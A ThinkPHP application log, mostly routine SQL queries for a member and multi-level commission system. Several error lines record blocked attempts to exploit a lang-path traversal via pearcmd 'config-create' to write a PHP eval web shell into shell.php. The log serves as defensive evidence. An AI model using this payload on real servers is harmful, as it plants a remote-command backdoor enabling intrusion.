[2022-12-11T14:50:34+08:00][sql] SELECT `fenxiao_id`,`fenxiao_no`,`fenxiao_name`,`mobile`,`member_id`,`level_id`,`level_name`,`parent`,`grand_parent`,`account`,`account_withdraw`,`account_withdraw_apply`,`status`,`create_time`,`audit_time`,`lock_time`,`one_fenxiao_order_num`,`one_fenxiao_order_money`,`one_child_num`,`one_child_fenxiao_num`,`two_child_fenxiao_num`,`total_commission`,`is_delete`,`two_rate` FROM `gxfc_fenxiao` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000365s ]
[2022-12-11T14:50:34+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000608s ]
[2022-12-11T14:50:34+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `source_member` = 2365 [ RunTime:0.000553s ]
[2022-12-11T14:50:34+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2365  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000466s ]
[2022-12-11T14:50:34+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_account` [ RunTime:0.000535s ]
[2022-12-11T14:50:34+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 33  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000327s ]
[2022-12-11T14:50:34+08:00][sql] SELECT `id`,`account_no`,`fenxiao_id`,`fenxiao_name`,`money`,`type`,`type_name`,`relate_id`,`create_time` FROM `gxfc_fenxiao_account` WHERE  `fenxiao_id` = 33 [ RunTime:0.000294s ]
[2022-12-11T14:50:34+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2365  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000466s ]
[2022-12-11T14:50:34+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000598s ]
[2022-12-11T14:50:34+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000343s ]
[2022-12-11T14:50:34+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000649s ]
[2022-12-11T14:50:34+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000325s ]
[2022-12-11T14:50:34+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000274s ]
[2022-12-11T14:50:34+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000265s ]
[2022-12-11T14:50:34+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 33 OR `two_fenxiao_id` = 33 OR `three_fenxiao_id` = 33 ) LIMIT 1 [ RunTime:0.000253s ]
[2022-12-11T14:50:38+08:00][sql] CONNECT:[ UseTime:0.000406s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T14:50:38+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000845s ]
[2022-12-11T14:50:38+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000294s ]
[2022-12-11T14:50:38+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000596s ]
[2022-12-11T14:50:38+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000532s ]
[2022-12-11T14:50:38+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2365  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000457s ]
[2022-12-11T14:50:38+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 33  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000269s ]
[2022-12-11T14:50:38+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2365  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000404s ]
[2022-12-11T14:50:38+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000448s ]
[2022-12-11T14:50:38+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000337s ]
[2022-12-11T14:50:38+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000654s ]
[2022-12-11T14:50:38+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000290s ]
[2022-12-11T14:50:38+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000254s ]
[2022-12-11T14:50:38+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000257s ]
[2022-12-11T14:50:38+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 33 OR `two_fenxiao_id` = 33 OR `three_fenxiao_id` = 33 ) LIMIT 1 [ RunTime:0.000256s ]
[2022-12-11T14:50:38+08:00][sql] CONNECT:[ UseTime:0.000383s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T14:50:38+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000818s ]
[2022-12-11T14:50:38+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000292s ]
[2022-12-11T14:50:38+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000476s ]
[2022-12-11T14:50:38+08:00][sql] SELECT `nickname`,`headimg` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000324s ]
[2022-12-11T15:00:28+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T15:00:28+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T15:00:32+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T15:00:32+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T15:00:37+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T15:00:37+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T18:10:39+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../../../../../../../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T20:53:30+08:00][sql] CONNECT:[ UseTime:0.000500s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T20:53:30+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000994s ]
[2022-12-11T20:53:30+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000346s ]
[2022-12-11T20:53:30+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000551s ]
[2022-12-11T20:53:30+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000574s ]
[2022-12-11T20:53:30+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2365  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000463s ]
[2022-12-11T20:53:30+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 33  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000321s ]
[2022-12-11T20:53:30+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2365  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000442s ]
[2022-12-11T20:53:30+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000546s ]
[2022-12-11T20:53:30+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000364s ]
[2022-12-11T20:53:30+08:00][sql] CONNECT:[ UseTime:0.000347s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T20:53:30+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000859s ]
[2022-12-11T20:53:30+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000300s ]
[2022-12-11T20:53:30+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000609s ]
[2022-12-11T20:53:30+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000559s ]
[2022-12-11T20:53:30+08:00][sql] SELECT `fenxiao_id`,`fenxiao_no`,`fenxiao_name`,`mobile`,`member_id`,`level_id`,`level_name`,`parent`,`grand_parent`,`account`,`account_withdraw`,`account_withdraw_apply`,`status`,`create_time`,`audit_time`,`lock_time`,`one_fenxiao_order_num`,`one_fenxiao_order_money`,`one_child_num`,`one_child_fenxiao_num`,`two_child_fenxiao_num`,`total_commission`,`is_delete`,`two_rate` FROM `gxfc_fenxiao` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000373s ]
[2022-12-11T20:53:30+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `source_member` = 2365 [ RunTime:0.000683s ]
[2022-12-11T20:53:30+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_account` [ RunTime:0.000629s ]
[2022-12-11T20:53:30+08:00][sql] SELECT `id`,`account_no`,`fenxiao_id`,`fenxiao_name`,`money`,`type`,`type_name`,`relate_id`,`create_time` FROM `gxfc_fenxiao_account` WHERE  `fenxiao_id` = 33 [ RunTime:0.000289s ]
[2022-12-11T20:53:30+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000640s ]
[2022-12-11T20:53:30+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000309s ]
[2022-12-11T20:53:30+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000292s ]
[2022-12-11T20:53:30+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000290s ]
[2022-12-11T20:53:30+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 33 OR `two_fenxiao_id` = 33 OR `three_fenxiao_id` = 33 ) LIMIT 1 [ RunTime:0.000286s ]
[2022-12-11T20:53:32+08:00][sql] CONNECT:[ UseTime:0.000459s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T20:53:32+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000926s ]
[2022-12-11T20:53:32+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000390s ]
[2022-12-11T20:53:32+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000567s ]
[2022-12-11T20:53:32+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000572s ]
[2022-12-11T20:53:32+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2365  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000450s ]
[2022-12-11T20:53:32+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 33  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000278s ]
[2022-12-11T20:53:32+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2365  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000505s ]
[2022-12-11T20:53:32+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000601s ]
[2022-12-11T20:53:32+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000352s ]
[2022-12-11T20:53:32+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000933s ]
[2022-12-11T20:53:32+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000427s ]
[2022-12-11T20:53:32+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000327s ]
[2022-12-11T20:53:32+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 33  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000292s ]
[2022-12-11T20:53:32+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 33 OR `two_fenxiao_id` = 33 OR `three_fenxiao_id` = 33 ) LIMIT 1 [ RunTime:0.000372s ]
[2022-12-11T20:53:32+08:00][sql] CONNECT:[ UseTime:0.000486s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T20:53:32+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000866s ]
[2022-12-11T20:53:32+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000308s ]
[2022-12-11T20:53:32+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000536s ]
[2022-12-11T20:53:32+08:00][sql] SELECT `nickname`,`headimg` FROM `gxfc_member` WHERE  `member_id` = 2365 LIMIT 1 [ RunTime:0.000283s ]
[2022-12-11T22:16:08+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T22:16:08+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_request['cmd']);?&gt;+/var/www/html/shell.php.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
